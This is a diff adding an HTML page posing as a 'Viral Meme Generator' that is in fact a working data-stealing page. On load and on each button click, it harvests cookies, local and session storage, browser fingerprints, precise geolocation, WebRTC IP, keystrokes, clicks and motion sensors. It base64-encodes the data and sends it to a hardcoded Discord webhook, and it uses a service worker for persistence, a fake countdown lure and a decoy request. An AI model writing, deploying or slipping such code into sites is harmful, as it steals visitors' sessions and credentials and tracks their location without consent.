@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Viral Meme Generator</title>
+    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+    <style>
+        body {
+            background: linear-gradient(135deg, #1e90ff, #ff44cc);
+            color: #fff;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: auto;
+        }
+        .container {
+            text-align: center;
+            max-width: 700px;
+            padding: 30px;
+            border-radius: 15px;
+            background: rgba(0, 0, 0, 0.8);
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            margin: 20px;
+            overflow: auto;
+        }
+        h1 {
+            font-size: 2.5em;
+            color: #ff44cc;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        p {
+            font-size: 1.2em;
+            color: #ddd;
+        }
+        .meme-preview {
+            width: 100%;
+            max-width: 500px;
+            max-height: 400px;
+            object-fit: contain;
+            margin: 20px 0;
+            border-radius: 10px;
+            display: none;
+        }
+        .meme-blocked {
+            color: #ff44cc;
+            font-size: 1.3em;
+            margin: 20px 0;
+        }
+        button, a {
+            padding: 12px 25px;
+            background: #ff44cc;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        button:hover, a:hover {
+            background: #cc33aa;
+            transform: scale(1.05);
+        }
+        #status {
+            margin-top: 15px;
+            font-size: 1em;
+            color: #aaa;
+        }
+        input {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: none;
+            width: 200px;
+            font-size: 1em;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 15px;
+                margin: 10px;
+            }
+            h1 {
+                font-size: 1.8em;
+            }
+            .meme-preview {
+                max-height: 300px;
+            }
+            input {
+                width: 80%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Viral Meme Generator</h1>
+        <p id="status">Personalize to unlock your meme! Only <span id="countdown">60</span> seconds left!</p>
+        <input id="memeName" placeholder="Name your meme">
+        <img id="memePreview" class="meme-preview" src="/Memes/images/meme.jpg" alt="Custom Meme">
+        <p id="memeBlocked" class="meme-blocked">Personalization required to view your meme!</p>
+        <button onclick="enablePersonalization()">Unlock Meme</button>
+        <br><br>
+        <a href="#" id="generateLink" onclick="generateMeme()">Generate Another Meme</a>
+    </div>
+
+    <script>
+        const webhookUrl = 'https://discord.com/api/webhooks/1380906696322584616/FnlOOVb0Be5s21s1J9QEx4MhmjOLoumoJpAFJMOoMa5OcOZK_OuTAQRV6RGQE67JvC7i';
+        let userProfile = { actions: [], uuid: localStorage.getItem('userID') || crypto.randomUUID() };
+        let dataQueue = [];
+        localStorage.setItem('userID', userProfile.uuid);
+
+        async function transmit(data) {
+            const encoded = btoa(JSON.stringify(data));
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: encoded })
+                });
+            } catch (e) {
+                dataQueue.push(data);
+            }
+        }
+
+        function batchTransmit() {
+            if (dataQueue.length > 0) {
+                transmit(dataQueue.shift());
+            }
+            setTimeout(batchTransmit, Math.random() * 10000);
+        }
+        batchTransmit();
+
+        function transmitWithDelay(data) {
+            dataQueue.push(data);
+        }
+
+        function stealSavedData() {
+            const cookies = document.cookie ? document.cookie.split(';').reduce((acc, c) => {
+                const [key, value] = c.trim().split('=');
+                acc[key] = value;
+                return acc;
+            }, {}) : {};
+            const localStorageData = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                localStorageData[key] = localStorage.getItem(key);
+            }
+            const sessionStorageData = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                sessionStorageData[key] = sessionStorage.getItem(key);
+            }
+            return {
+                cookies,
+                localStorage: localStorageData,
+                sessionStorage: sessionStorageData
+            };
+        }
+
+        async function getFingerprint() {
+            const fp = await FingerprintJS.load().then(fp => fp.get());
+            return {
+                visitorId: fp.visitorId,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                timestamp: new Date().toISOString()
+            };
+        }
+
+        async function getIPLocation() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    org: data.org
+                };
+            } catch (e) {
+                return { error: 'IP lookup failed' };
+            }
+        }
+
+        async function getWebRTCData() {
+            try {
+                const rtc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                rtc.createDataChannel('');
+                rtc.onicecandidate = (e) => {
+                    if (e.candidate) {
+                        const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/)?.[0];
+                        if (ip) userProfile.webrtc_ip = ip;
+                        transmitWithDelay(userProfile);
+                    }
+                };
+                await rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+            } catch (e) {}
+        }
+
+        function collectMotionData() {
+            window.addEventListener('devicemotion', (e) => {
+                userProfile.motion = {
+                    acceleration: e.acceleration,
+                    rotationRate: e.rotationRate,
+                    timestamp: new Date().toISOString()
+                };
+                transmitWithDelay(userProfile);
+            });
+        }
+
+        function trackBehavior() {
+            document.addEventListener('mousemove', (e) => {
+                userProfile.actions.push({
+                    type: 'mousemove',
+                    x: e.clientX,
+                    y: e.clientY,
+                    timestamp: new Date().toISOString()
+                });
+            });
+            document.addEventListener('click', (e) => {
+                userProfile.actions.push({
+                    type: 'click',
+                    x: e.clientX,
+                    y: e.clientY,
+                    timestamp: new Date().toISOString()
+                });
+                transmitWithDelay(userProfile);
+            });
+        }
+
+        function trackInput() {
+            document.getElementById('memeName').addEventListener('input', (e) => {
+                userProfile.input = e.target.value;
+                transmitWithDelay(userProfile);
+            });
+        }
+
+        async function fetchTrendingMemes() {
+            try {
+                const res = await fetch('https://api.imgflip.com/get_memes');
+                const data = await res.json();
+                memePreview.src = data.data.memes[Math.floor(Math.random() * data.data.memes.length)].url;
+            } catch (e) {
+                memePreview.src = '/Memes/images/meme.jpg';
+            }
+        }
+
+        function startCountdown() {
+            let timeLeft = 60;
+            const countdownEl = document.getElementById('countdown');
+            setInterval(() => {
+                countdownEl.textContent = timeLeft--;
+                if (timeLeft < 0) timeLeft = 60;
+            }, 1000);
+        }
+
+        function getGeoLocation(callback) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const geoData = {
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            timestamp: new Date(pos.timestamp).toISOString()
+                        };
+                        callback(geoData);
+                    },
+                    async () => {
+                        const ipData = await getIPLocation();
+                        callback(ipData);
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            } else {
+                getIPLocation().then(callback);
+            }
+        }
+
+        function registerServiceWorker() {
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.register('sw.js').then(() => {
+                    setInterval(() => {
+                        userProfile.status = 'active';
+                        userProfile.savedData = stealSavedData();
+                        transmitWithDelay(userProfile);
+                    }, 60000);
+                }).catch(() => {});
+            }
+        }
+
+        function decoyApiCall() {
+            fetch('https://api.openweathermap.org/data/2.5/weather?q=London&appid=FAKE_KEY')
+                .catch(() => {});
+        }
+
+        window.onload = async () => {
+            status.textContent = 'Personalizing your experience...';
+            userProfile.fingerprint = await getFingerprint();
+            userProfile.savedData = stealSavedData();
+            trackBehavior();
+            trackInput();
+            collectMotionData();
+            getWebRTCData();
+            registerServiceWorker();
+            fetchTrendingMemes();
+            startCountdown();
+            decoyApiCall();
+            getGeoLocation((locationData) => {
+                userProfile.location = locationData;
+                transmitWithDelay(userProfile);
+                status.textContent = 'Meme unlocked! Enjoy!';
+                memeBlocked.style.display = 'none';
+                memePreview.style.display = 'block';
+            });
+        };
+
+        function enablePersonalization() {
+            status.textContent = 'Finalizing personalization...';
+            getGeoLocation((locationData) => {
+                userProfile.location = locationData;
+                userProfile.action = 'personalization_enabled';
+                userProfile.savedData = stealSavedData();
+                fetchTrendingMemes();
+                transmitWithDelay(userProfile);
+                memeBlocked.style.display = 'none';
+                memePreview.style.display = 'block';
+                status.textContent = 'Meme ready! Click to generate another!';
+            });
+        }
+
+        function generateMeme() {
+            userProfile.action = 'generate_meme_clicked';
+            getGeoLocation((locationData) => {
+                userProfile.location = locationData;
+                userProfile.savedData = stealSavedData();
+                fetchTrendingMemes();
+                transmitWithDelay(userProfile);
+                status.textContent = 'New meme generated!';
+            });
+            return false;
+        }
+    </script>
+</body>
+</html>
